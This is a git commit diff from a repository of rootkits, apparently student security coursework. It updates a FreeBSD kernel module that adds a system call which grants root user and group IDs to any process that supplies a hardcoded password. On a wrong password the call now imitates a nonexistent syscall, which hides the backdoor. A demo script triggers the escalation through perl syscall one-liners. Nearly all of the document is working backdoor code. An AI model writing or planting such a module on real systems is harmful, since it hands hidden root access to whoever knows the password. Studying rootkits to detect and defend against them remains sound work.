2796bbac943c70e0b129c002db89fdc8fb5cc0ef
johnsonshi <johnson@johnsonshi.com>
2018-09-24 07:19:15 +1000

    Module now calls lkmnosys for incorrect password. Demo now uses perl instead of interface.c. Update README and Makefile

--- rootkits/priv_esc_syscall/demo.sh
+++ rootkits/priv_esc_syscall/demo.sh
@@ -1,11 +1,11 @@
 #!/bin/sh
 
-set -e
-
-KLDNAME='priv_esc.ko'
-PASSWD='6447_priv_esc_passwda'
-
 make 2>&1 > /dev/null
-kldload module/$KLDNAME || (kldunload $KLDNAME && kldload module/$KLDNAME)
-./interface/interface $PASSWD
-kldunload $KLDNAME
+
+echo 'make sure the module is loaded'
+
+echo 'syscall with incorrect password'
+perl -e '$str = "1234";' -e 'syscall(210, $str);'
+
+echo 'syscall with correct password (escalates us to root)'
+perl -e '$str = "6447_priv_esc_passwd";' -e 'syscall(210, $str);'
--- rootkits/priv_esc_syscall/module/priv_esc.c
+++ rootkits/priv_esc_syscall/module/priv_esc.c
@@ -23,22 +23,16 @@ struct sc_args {
 /* The system call function. */
 static int
 priv_esc(struct thread *td, void *syscall_args) {
-    struct sc_args * args = (struct sc_args *) syscall_args;
 
-    if (syscall_args == NULL || strcmp(args->passwd, PRIV_ESC_PASSWD) != 0) {
-        // TODO still need to defend against 0 args passed in. syscll_args == NULL check doesn't work
-        uprintf("[*] module: incorrect password provided\n");
-        tdsignal(td, SIGSYS);
-        return ENOSYS;
+    struct sc_args * args = (struct sc_args *) syscall_args;
+    if (strcmp(args->passwd, PRIV_ESC_PASSWD) != 0) {
+        // TODO check for no args passed (otherwise crashes kernel)
+        return (lkmnosys(td, NULL));
     }
 
     td->td_ucred->cr_uid = td->td_ucred->cr_ruid = td->td_ucred->cr_svuid = 0u;
     td->td_ucred->cr_gid = td->td_ucred->cr_rgid = td->td_ucred->cr_svgid = 0u;
-
-    uprintf("[*] module: correct password provided\n");
-    uprintf("[*] module: this process now has uid and gid of root\n");
-
-	return 0;
+	return (0);
 }
 
 /* The sysent for the new system call. */
@@ -53,7 +47,7 @@ static int offset = NO_SYSCALL;
 /* The function called at load/unload. */
 static int
 load(struct module *module, int cmd, void *arg) {
-    return 0;
+    return (0);
 }
 
 SYSCALL_MODULE(priv_esc, &offset, &priv_esc_sysent, load, NULL);
